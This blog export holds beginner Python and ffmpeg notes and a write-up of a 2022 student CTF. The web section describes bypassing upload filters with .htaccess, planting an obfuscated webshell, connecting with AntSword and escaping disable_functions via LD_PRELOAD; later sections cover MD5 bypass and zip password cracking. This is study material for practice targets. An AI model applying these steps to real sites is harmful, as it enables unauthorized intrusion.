<h3 id="level1"><a href="#level1" class="headerlink" title="level1:"></a>level1:</h3><p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211021358848.png" alt="1"></p>
<p>代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment">#1-剪刀；2-石头；3-布</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">count_pc=<span class="number">0</span></span><br><span class="line">count_per=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> count_per&lt;<span class="number">3</span> <span class="keyword">and</span> count_pc&lt;<span class="number">3</span>:</span><br><span class="line">    pc=random.randint(<span class="number">1</span>,<span class="number">3</span>)</span><br><span class="line">    per=<span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;输入选择：1-剪刀；2-石头；3-布&quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> per==<span class="number">1</span> <span class="keyword">and</span> pc==<span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;平&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> per==<span class="number">1</span> <span class="keyword">and</span> pc==<span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;you lose&quot;</span>)</span><br><span class="line">        count_pc=count_pc+<span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> per==<span class="number">1</span> <span class="keyword">and</span> pc==<span class="number">3</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;you win&quot;</span>)</span><br><span class="line">        count_per=count_per+<span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> per==<span class="number">2</span> <span class="keyword">and</span> pc==<span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;you win&quot;</span>)</span><br><span class="line">        count_per=count_per+<span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> per==<span class="number">2</span> <span class="keyword">and</span> pc==<span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;平局&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> per==<span class="number">2</span> <span class="keyword">and</span> pc==<span class="number">3</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;you lose&quot;</span>)</span><br><span class="line">        count_pc=count_pc+<span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> per==<span class="number">3</span> <span class="keyword">and</span> pc==<span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;you lose&quot;</span>)</span><br><span class="line">        count_pc=count_pc+<span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> per==<span class="number">3</span> <span class="keyword">and</span> pc==<span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;you win&quot;</span>)</span><br><span class="line">        count_per=count_per+<span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> per==<span class="number">3</span> <span class="keyword">and</span> pc==<span class="number">3</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;平局&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> count_pc==<span class="number">3</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;总比分为&#123;&#125;:&#123;&#125;,你输了&quot;</span>.<span class="built_in">format</span>(count_pc,count_per))</span><br><span class="line"><span class="keyword">elif</span> count_per==<span class="number">3</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;总比分为&#123;&#125;:&#123;&#125;,你赢了了&quot;</span>.<span class="built_in">format</span>(count_pc,count_per))</span><br></pre></td></tr></table></figure>

<p>想不出来有啥其他算法简化了，就用最傻逼的elif好了</p>
<h3 id="level2"><a href="#level2" class="headerlink" title="level2:"></a>level2:</h3><p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211021359596.png" alt="2"></p>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码:"></a>代码:</h4><p>mod:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">beautiful</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&#123;&#125; is beautiful&quot;</span>.<span class="built_in">format</span>(x))</span><br></pre></td></tr></table></figure>

<p>main:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">from mod import beautiful</span><br><span class="line">beautiful(&quot;python&quot;)</span><br></pre></td></tr></table></figure>

<h3 id="level3"><a href="#level3" class="headerlink" title="level3:"></a>level3:</h3><p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211021400840.png" alt="3"></p>
<p>代码:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">import requests,re</span><br><span class="line"></span><br><span class="line">def del_join(del_content,list_content):</span><br><span class="line">    for i in list_content:</span><br><span class="line">        list=re.split(del_content,i)</span><br><span class="line">        str=&quot;&quot;</span><br><span class="line">        print(&quot;&#123;&#125;\t&quot;.format(str.join(list)),end=&quot;&quot;)</span><br><span class="line"></span><br><span class="line">url=&quot;https://www.tianqi.com/chongqing/7/&quot;</span><br><span class="line">headers=&#123;</span><br><span class="line">&quot;user-agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.52&quot;</span><br><span class="line">&#125;</span><br><span class="line">html=requests.get(url,headers=headers).text</span><br><span class="line"></span><br><span class="line">temp_ch=re.compile(r&#x27;&lt;div class=&quot;weaul_z&quot;&gt;&lt;span&gt;(.*?)&lt;/div&gt;&#x27;)</span><br><span class="line">date_ch=re.compile(r&#x27;&lt;span class=&quot;fl&quot;&gt;(.*?)&lt;/span&gt;&#x27;)</span><br><span class="line">week_ch=re.compile(r&#x27;&lt;span class=&quot;fr&quot;&gt;(.*?)&lt;/span&gt;&#x27;)</span><br><span class="line"></span><br><span class="line">temp=temp_ch.findall(html)</span><br><span class="line">date=date_ch.findall(html)</span><br><span class="line">week=week_ch.findall(html)</span><br><span class="line"></span><br><span class="line">for i in date:</span><br><span class="line">    print(&quot;&#123;&#125;\t&quot;.format(i),end=&quot;&quot;)</span><br><span class="line">print(&quot;\n&quot;)</span><br><span class="line">for i in week:</span><br><span class="line">    print(&quot;&#123;&#125;\t&quot;.format(i),end=&quot;&quot;)</span><br><span class="line">print(&quot;\n&quot;)</span><br><span class="line">del_join(&quot;&lt;span&gt;|&lt;/span&gt;&quot;,temp)</span><br></pre></td></tr></table></figure>

<p>用requests和re模块，本来想用beautifulsoup，但爬出来会有乱码，放弃了</p>
<p>re具体的筛选就用温度、日期前边的div类型，然后出来的是个list</p>
<p>只有温度中间有其他的字符，就定义一个”del_join”函数，把温度中间的span和&#x2F;span删掉再拼接起来就好了</p>
<h3 id="level4"><a href="#level4" class="headerlink" title="level4:"></a>level4:</h3><p>搭建novelai，显卡1066，搭了也没啥用，懒得搭了</p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>基础</tag>
      </tags>
  </entry>
  <entry>
    <title>合并flv文件</title>
    <url>/2022/11/05/%E5%90%88%E5%B9%B6flv/</url>
    <content><![CDATA[<p>来源于我傻逼设置把每个视频切成10mb的小视频了，需要合并</p>
<p>首先安装FFmpeg</p>
<p>先把所需的所有视频下下来，按先后顺序排列</p>
<p>在linux中重命名（更方便，重命名为1-x的顺序）</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211052001576.png" alt="image-20221105200145494"></p>
<p>这样选择，“文字”留空，“文字格式”选择“数字-文字”，确保新名称为类似01.flv的有顺序的名字</p>
<p>在当前文件夹打开终端，输入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for f in *.flv; do echo &quot;file &#x27;$f&#x27;&quot; &gt;&gt; mylist.txt; done</span><br></pre></td></tr></table></figure>

<p>会有如下的txt文件</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211052005882.png" alt="image-20221105200531854"></p>
<p>然后继续在终端输入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ffmpeg -f concat -i mylist.txt -c copy output.flv</span><br></pre></td></tr></table></figure>

<p>等待完成，output.flv即为合并后的文件</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211052013802.png" alt="image-20221105201307761"></p>
]]></content>
      <categories>
        <category>怪东西</category>
      </categories>
      <tags>
        <tag>其他</tag>
      </tags>
  </entry>
  <entry>
    <title>flv2mp4</title>
    <url>/2022/11/10/flv2mp4/</url>
    <content><![CDATA[<p>借助FFmpeg把flv封装为mp4文件</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202211101629273.png" alt="202211101629273.png"></p>
<p>效果如下</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202211101629263.png" alt="202211101629263.png"></p>
<p>相比其他的转码，速度更快更好</p>
]]></content>
      <categories>
        <category>怪东西</category>
      </categories>
      <tags>
        <tag>其他</tag>
      </tags>
  </entry>
  <entry>
    <title>传入文件</title>
    <url>/2022/11/10/%E4%BC%A0%E5%85%A5%E6%96%87%E4%BB%B6/</url>
    <content><![CDATA[<p>记录一下windows环境下用批处理查看传入的文件详情</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211101622522.png" alt="image-20221110162240500"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@echo off </span><br><span class="line">	echo 文件全路径：	%1</span><br><span class="line">	echo 短路径名：	%~s1</span><br><span class="line">	echo 盘符+路径：	%~dp1</span><br><span class="line">	echo 盘符：		%~d1</span><br><span class="line">	echo 路径：		%~p1</span><br><span class="line">	echo 文件+后缀名：	%~nx1</span><br><span class="line">	echo 文件名：		%~n1</span><br><span class="line">	echo 后缀名：		%~x1</span><br><span class="line">	echo 文件属性：	%~a1</span><br><span class="line">	echo 日期/时间：	%~t1</span><br><span class="line">	echo 文件大小：	%~z1</span><br><span class="line">pause</span><br></pre></td></tr></table></figure>

<p>拖入文件如下</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211101623462.png" alt="image-20221110162318445"></p>
]]></content>
      <categories>
        <category>怪东西</category>
      </categories>
      <tags>
        <tag>其他</tag>
      </tags>
  </entry>
  <entry>
    <title>2022红岩新生杯</title>
    <url>/2022/11/21/2022%E7%BA%A2%E5%B2%A9%E6%96%B0%E7%94%9F%E6%9D%AF/</url>
    <content><![CDATA[<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="简单题，但是沃玛"><a href="#简单题，但是沃玛" class="headerlink" title="简单题，但是沃玛"></a>简单题，但是沃玛</h3><p>在js文件里看到redrockctf函数，flag应该就在这里边</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201850817.png" alt="1"></p>
<p>本来看到”Uh，f1a9!”的时候以为只有f1a9才是真正的flag，还蒙了好久，直到出了hint</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201852662.png" alt="0"></p>
<p>ok，那手拼函数就完事了</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201852336.png" alt="2"></p>
<p>第三部分分了两个，分别解码一下就出来了两个方法</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211211539112.png" alt="3"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201853359.png" alt="4"></p>
<p>写个c跑一下</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201903785.png" alt="5"></p>
<p>显然第一个刚好是沃玛的b站uid，再把三个拼接起来就得到flag了（后边的#redr0cksrE2o22也要加上）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redrock&#123;https://space.bilibili.com/53456#redr0cksrE2o22&#125;</span><br></pre></td></tr></table></figure>

<h3 id="你是哪里的"><a href="#你是哪里的" class="headerlink" title="你是哪里的"></a>你是哪里的</h3><p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201906573.png" alt="1"></p>
<p>直接打开，发现让我必须来自<a href="https://redrock.team/">https://redrock.team</a></p>
<p>那就用burpsuite加上referer栏</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201907652.png" alt="2"></p>
<p>发过去得到flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201908413.png" alt="3"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redrock&#123;we1c0me t0 redr0ck ctf&#125;</span><br></pre></td></tr></table></figure>

<h3 id="我新写的代码啊"><a href="#我新写的代码啊" class="headerlink" title="我新写的代码啊"></a>我新写的代码啊</h3><p>进入网页发现看不出来啥</p>
<p>dirsearch开扫，发现bak文件，下载</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201914714.png" alt="0"></p>
<p>index.bak文件如下</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201915182.png" alt="1"></p>
<p>分析一下可知if判断的路劲如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201915590.png" alt="路径"></p>
<p>看到两个判断是用md5，两个是用文本匹配，那就看一下md5加密绕过构建ABabc五个内容</p>
<p>参考：<a href="https://blog.csdn.net/Jeff_12138/article/details/121847582">PHP中MD5加密的简单绕过及基于MD5加密的SQL注入_Landasika的博客-CSDN博客</a></p>
<p>用GET方法试一下md5绕过是否成功</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201917019.png" alt="2"></p>
<p>看来确实是可行的，但是文中写到c要用POST方法传</p>
<p>参考：<a href="https://blog.csdn.net/Zhuoqian_1/article/details/114486774">get_post 攻防世界 使用burpsuite发送GET、POST请求_Zhuoqian_1的博客-CSDN博客</a></p>
<p>构建一下c传过去，得到flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201918214.png" alt="3"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redrock&#123;Php!sv2ryg004&#125;</span><br></pre></td></tr></table></figure>

<h3 id="RemindYourHead"><a href="#RemindYourHead" class="headerlink" title="RemindYourHead"></a>RemindYourHead</h3><p>把网址在burpsuite中打开一下，翻出来flag</p>
<p>(这flag每次都不一样，我比赛截的图和复现截的图不是同一个)</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201921996.png" alt="1"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redrock&#123;820a5bf5-4df9-4058-84a4-054af00b3b78&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Easy-upload"><a href="#Easy-upload" class="headerlink" title="Easy_upload"></a>Easy_upload</h3><p>看到hint，提示有两个flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201924055.png" alt="0"></p>
<p>看到是上传题，试一下一句话木马，但被拒绝了</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201925592.png" alt="1"></p>
<p>那就试一下.htaccess文件绕过</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201926618.png" alt="2"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201929343.png" alt="2-1"></p>
<p>在burp中把.jpg去掉，实现上传，再次上传一句话木马还是不行，那可能就在内容被检测了</p>
<p>参考：<a href="https://blog.csdn.net/weixin_42250835/article/details/120058908">WEB漏洞攻防 - 文件上传漏洞 - CTF - [极客大挑战 2019]Upload-1</a></p>
<p>制作一下变形马，然后上传成功了</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201929197.png" alt="3"></p>
<p>打开蚁剑然后连接</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201929456.png" alt="4"></p>
<p>上传根目录发现一个flag和readflag，这个flag应该是真flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201937561.png" alt="readflag"></p>
<p>在终端里发现是一点权限没有</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201930476.png" alt="5"></p>
<p>看一下phpinfo</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201930699.png" alt="6"></p>
<p>被禁用的函数有这么多</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201930096.png" alt="7"></p>
<h4 id="法一：蚁剑插件"><a href="#法一：蚁剑插件" class="headerlink" title="法一：蚁剑插件"></a>法一：蚁剑插件</h4><p>那就用蚁剑里的插件绕过一下</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201931865.png" alt="8"></p>
<p>由于<strong>LD_PRELOAD需要基于php连接才能绕过</strong>，所以我之前传的变形马是<strong>不能用</strong>的</p>
<p>所以用蚁剑的上传功能，在上传根目录上传简单的一句话木马</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201935439.png" alt="12"></p>
<p> 然后重新制作.antproxy.php</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211211529491.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201936689.png" alt="15"></p>
<p>完成绕过了disable_function，那就进入终端，输入readflag里提示的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tac ./flag</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201939704.png" alt="17"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redrock&#123;2315jih452ghu542o5431giu5214huiog35431hp&#125;</span><br></pre></td></tr></table></figure>

<h4 id="法二：LD-PRELOAD无插件版"><a href="#法二：LD-PRELOAD无插件版" class="headerlink" title="法二：LD_PRELOAD无插件版"></a>法二：LD_PRELOAD无插件版</h4><p>详情[<a href="https://redrock.feishu.cn/wiki/wikcnXw7EpomHHepm1HGObUF4pC">web]Easy_upload - 飞书云文档 (feishu.cn)</a></p>
<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>RT</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201942248.jpg" alt="0"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redrock&#123;020804&#125;</span><br></pre></td></tr></table></figure>

<h3 id="芝士雪豹与只因"><a href="#芝士雪豹与只因" class="headerlink" title="芝士雪豹与只因"></a>芝士雪豹与只因</h3><p>hint是一个png，先丢到binwalk里看看有没有藏东西</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201952692.png" alt="0"></p>
<p>有藏另一个图片文件，那就foremost提取出来</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201953102.png" alt="1"></p>
<p>看到是个二维码，但是左上左下缺了数据，那就用ps补全，然后扫码得到了提示：密码是qingshui</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201953133.png" alt="2"></p>
<p>知道有密码，优先考虑一下MP3Stego，得到了个txt文件</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201955296.png" alt="3"></p>
<p>里边是emoji，那就考虑一下base100解码</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201956800.png" alt="4"></p>
<p>再把得到的用base64再解码得到flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201956409.png" alt="5"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redrock&#123;Sn0w_le0pard_Shut_up&#125;</span><br></pre></td></tr></table></figure>

<h4 id="bug"><a href="#bug" class="headerlink" title="bug:"></a>bug:</h4><p>最开始用的mp3stego可能是版本有问题，丢进去提示</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">OpenTable: could not find tables/huffdec </span><br><span class="line">Check local directory &#x27;./tables/&#x27; </span><br><span class="line">Please check huffman table &#x27;huffdec&#x27;</span><br></pre></td></tr></table></figure>

<p>在github上再下一个就解决了</p>
<h3 id="啵啵的魔法药水"><a href="#啵啵的魔法药水" class="headerlink" title="啵啵的魔法药水"></a>啵啵的魔法药水</h3><p>看到是docker题</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211202002712.png" alt="0"></p>
<h4 id="法一：直接在docker-hub里找"><a href="#法一：直接在docker-hub里找" class="headerlink" title="法一：直接在docker hub里找"></a>法一：直接在docker hub里找</h4><p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211202003998.png" alt="1"></p>
<p>往下翻看到flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211202003617.png" alt="2"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redrock&#123;Wit-Sharpening_Potion.&#125;</span><br></pre></td></tr></table></figure>

<p>其实这个方法是无奈之举，我kali安装的podman，甚至没办法pull这个镜像</p>
<h4 id="法二："><a href="#法二：" class="headerlink" title="法二："></a>法二：</h4><p>卸载podman然后安装docker，pull这个镜像</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211202005056.png" alt="0-6"></p>
<p>然后用docker inspect查看镜像内容</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211202006421.png" alt="2-1"></p>
<p>往下翻找到flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211211603799.png" alt="2-2"></p>
<h4 id="补：卸载podman"><a href="#补：卸载podman" class="headerlink" title="补：卸载podman"></a>补：卸载podman</h4><p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211202006699.png" alt="0-1"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211202007763.png" alt="0-2"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211202006493.png" alt="0-3"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211202006524.png" alt="0-4"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211202007221.png" alt="0-5"></p>
<h3 id="你TM故意压缩flag是吧？"><a href="#你TM故意压缩flag是吧？" class="headerlink" title="你TM故意压缩flag是吧？"></a>你TM故意压缩flag是吧？</h3><p>显然，这是个有114514层的多层压缩，那就写个循环解压脚本</p>
<p>参考：<a href="https://blog.csdn.net/brightendavid/article/details/115637957">递归解压zip文件_brightendavid的博客-CSDN博客</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=gbk</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"></span><br><span class="line"><span class="built_in">dir</span> = <span class="string">&quot;C:\\Users\\*****\\Desktop\\work\\ctf\\unzip\\&quot;</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">0</span></span><br><span class="line">s2 = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">jieya</span>():</span><br><span class="line">        i = <span class="string">&quot;14514.zip&quot;</span></span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">114514</span>):</span><br><span class="line">            ss = i[:i.find(<span class="string">&quot;.&quot;</span>)]</span><br><span class="line">            <span class="built_in">print</span>(i)</span><br><span class="line">            zpf = zipfile.ZipFile(<span class="built_in">dir</span> + ss + <span class="string">&quot;.zip&quot;</span>)</span><br><span class="line">            <span class="built_in">list</span> = zpf.namelist()  <span class="comment"># 得到压缩包里所有文件</span></span><br><span class="line">            <span class="keyword">for</span> f <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">                zpf.extract(f, <span class="built_in">dir</span>, ss.encode(<span class="string">&#x27;utf-8&#x27;</span>))  <span class="comment"># 循环解压文件到指定目录</span></span><br><span class="line">            <span class="built_in">print</span>(ss + <span class="string">&quot;done&quot;</span> + <span class="built_in">str</span>(f))</span><br><span class="line">            i = <span class="built_in">str</span>(f)</span><br><span class="line"></span><br><span class="line">jieya()</span><br></pre></td></tr></table></figure>

<p>这样解压114514层之后，得到了最后一层yyz</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211202011170.png" alt="0"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211202011553.png" alt="1"></p>
<p>但是这个是加密的，而不知道密码，那就猜测是否为伪加密</p>
<p>参考：<a href="http://www.mchz.com.cn/cn/service/safety-lab/info_26.aspx?itemid=5175&ezeip=es515pfuwaihdff3mzwbdg==">CTF之压缩包处理 (mchz.com.cn)</a></p>
<p>显然这个是真加密（试过都改00，没啥用）</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211202012915.png" alt="2"></p>
<p>那就直接爆破密码，用hash爆破一下</p>
<p>参考：<a href="https://blog.csdn.net/m0_60319766/article/details/122982767">ctf赛题MISC二维码_QJ_zjj的博客-CSDN博客</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211202013306.png" alt="3"></p>
<p>解压出来是个base64解密之后的内容，解码</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211202014941.png" alt="4"></p>
<p>其实用ARCHPR更快，只不过自带的字典纯纯垃圾，换个字典就几秒钟的事</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211202014518.png" alt="5"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redrock&#123;arey0u0k?&#125;</span><br></pre></td></tr></table></figure>

<h3 id="流量审计"><a href="#流量审计" class="headerlink" title="流量审计"></a>流量审计</h3><p>看到flag点进去，看一下内容得到flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211202016521.png" alt="1"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redrock&#123;yyz_is_god&#125;</span><br></pre></td></tr></table></figure>

<h2 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h2><h3 id="just-re-it"><a href="#just-re-it" class="headerlink" title="just_re_it"></a>just_re_it</h3><p>把exe文件丢进010 Editor看一下，只发现了个fake（？）flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211202018686.png" alt="0"></p>
<p>把这个输进文件再看看</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211202018953.png" alt="1"></p>
<p>好吧，好像这个确实是real flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redrock&#123;This_is_fake_flag&#125;</span><br></pre></td></tr></table></figure>

<h3 id="水水爱听歌"><a href="#水水爱听歌" class="headerlink" title="水水爱听歌"></a>水水爱听歌</h3><p>得到pyc文件，在<a href="https://tool.lu/pyc/">python反编译 - 在线工具 (tool.lu)</a>反编译一下</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211202020243.png" alt="0"></p>
<p>看到zzz使用了base64编码，那就解码出来得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">She_bid_me_to_take_love_easy_as_the_leaves_grow_on_the_tree</span><br></pre></td></tr></table></figure>

<p>再看一下代码，发现check函数时判断输入的flag变量和zzz是否相同（？），那就直接输入zzz（base64解码之后的），得到flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202211212042172.png" alt="1"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redrock&#123;044d7a01a972dc5882831e89676220c2dc3a3c142e16379a76a45680137a6b55&#125;</span><br></pre></td></tr></table></figure>

<h3 id="赛博丁真"><a href="#赛博丁真" class="headerlink" title="赛博丁真"></a>赛博丁真</h3><p>把exe文件丢进010看一下，得到flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211202024616.png" alt="0"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redrock&#123;ggg_ding_zhen&#125;</span><br></pre></td></tr></table></figure>

<h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="可惜我年轻无知"><a href="#可惜我年轻无知" class="headerlink" title="可惜我年轻无知"></a>可惜我年轻无知</h3><p>题目告诉我</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yveypbl&#123;kfu_h_kvhsq_mpfsq_dse_appjhgx_rhux_xvy_rpfje_spu_dqyvv&#125;</span><br></pre></td></tr></table></figure>

<p>显然，yveypbl&#x3D;》redrock，这是一一对应的，那就是考虑映射，但显然手推不可能，就用词频分析</p>
<p>网站：<a href="http://quipqiup.com/">quipqiup - cryptoquip and cryptogram solver</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211202027378.png" alt="0"></p>
<p>得到第一个就是，把空格换成_就得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redrock&#123;but_i_being_young_and_foolish_with_her_would_not_agree&#125;</span><br></pre></td></tr></table></figure>

<h3 id="来自红岩的密文1"><a href="#来自红岩的密文1" class="headerlink" title="来自红岩的密文1"></a>来自红岩的密文1</h3><p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211202031602.png" alt="0"></p>
<p>一看就觉得是Unicode编码，解码得到flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211202032449.png" alt="1"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redrock&#123;Welc0me_T0_The_CTF_0f_redR0ck!!!&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>题解</tag>
